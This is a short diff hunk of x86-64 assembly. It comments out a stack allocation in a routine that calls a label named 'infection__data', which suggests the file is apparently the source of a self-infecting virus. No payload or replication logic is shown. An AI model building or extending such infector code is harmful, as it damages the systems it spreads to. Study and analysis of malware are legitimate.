@@ -8,7 +8,7 @@ main:
    mov [rsp+0x10],rdi
    mov [rsp+8],rbp
    mov rbp,rsp
-   sub rsp,0x40
+   ; sub rsp,0x40                 
 
    call infection__data
 infection__data__start:
